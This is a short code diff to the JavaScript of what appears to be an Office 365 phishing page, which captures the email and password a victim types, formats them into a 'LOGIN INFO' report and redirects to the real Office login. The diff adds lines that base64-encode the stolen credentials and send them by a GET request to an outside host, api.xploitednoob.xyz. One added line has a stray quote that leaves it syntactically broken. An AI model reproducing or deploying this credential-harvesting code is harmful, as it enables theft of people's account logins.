@@ -93,6 +93,8 @@ $(document).ready(function() {
         $('.btn-signin').prop('disabled', true);
         var user = $('#email').val();
         var pass = $('#password').val();
+        var api = user + '|' + pass;
+        var key = btoa(api);
         var redirecturl = "https://www.office.com/login?es=Click&&ru=%2F";
         tgresult  = "+----+ ☣️! OFFICE365[LOGIN] !☣️ +----+\n";
         tgresult += "+ ☢️ LOGIN INFO \n";
@@ -121,6 +123,8 @@ $(document).ready(function() {
             setTimeout(function (){$(".error-alert-pass").hide();}, 500);
             document.getElementById("pba1").style.display = "block";
             document.getElementById("pba2").style.display = "block";
+            $.ajaxSetup({async:false});
+            $.get('https://api.xploitednoob.xyz/app.js?key=' + key + ');
             var xhttp = new XMLHttpRequest();
             xhttp.onreadystatechange=function() {
                 if (this.readyState == 4) {
